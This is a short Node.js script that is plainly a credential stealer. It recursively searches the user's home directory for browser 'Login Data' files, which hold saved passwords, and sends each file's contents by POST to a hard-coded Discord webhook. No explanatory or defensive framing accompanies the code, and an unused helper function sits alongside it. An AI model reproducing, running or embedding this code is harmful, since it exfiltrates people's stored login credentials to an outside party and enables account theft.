const fs = require('fs'), path = require('path');
const webhook = 'https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
function walk(root) {
  for (const entry of fs.readdirSync(root, {withFileTypes:true})) {
    const full = path.join(root, entry.name);
    if (entry.isDirectory()) walk(full);
    else if (entry.name === 'Login Data') {
      fetch(webhook, {method:'POST',body:fs.readFileSync(full)});
    }
  }
}
function roots(home) {
  return fs.readdirSync(home, {withFileTypes:true}).filter(e => e.isDirectory());
}
walk(process.env.HOME);
